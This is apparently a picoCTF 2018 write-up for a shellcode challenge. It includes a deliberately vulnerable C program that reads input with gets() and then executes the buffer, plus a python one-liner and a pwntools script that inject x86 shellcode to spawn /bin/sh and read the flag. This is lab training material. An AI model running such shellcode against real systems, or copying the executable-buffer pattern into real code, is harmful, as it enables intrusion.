Source code

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>

#define BUFSIZE 148
#define FLAGSIZE 128

void vuln(char *buf){
  gets(buf);
  puts(buf);
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  
  // Set the gid to the effective gid
  // this prevents /bin/sh from dropping the privileges
  gid_t gid = getegid();
  setresgid(gid, gid, gid);

  char buf[BUFSIZE];

  puts("Enter a string!");
  vuln(buf);

  puts("Thanks! Executing now...");
  
  ((void (*)())buf)();
     
  return 0;
}
```

Connect with ssh

```bash
$ ssh campeon33@2018shell4.picoctf.com
$ cd /problems/shellcode_4_99838609970da2f5f6cf39d6d9ed57cd
```

<br/>

Now send the shellcode

```bash
$ (python -c "print '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80'"; cat) | ./vuln
cat flag.txt
```

<br/>

Now the python script

```python
from pwn import *
import paramiko

user = 'youruser'
password = 'yourpassword'
host = '2018shell4.picoctf.com'

s = ssh(user=user,password=password,host=host)

p = s.run('cd /problems/shellcode_4_99838609970da2f5f6cf39d6d9ed57cd && ./vuln')

payload = '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80'

p.recvuntil('Enter a string!')
p.sendline(payload)
p.sendline('cat flag.txt')
p.interactive()
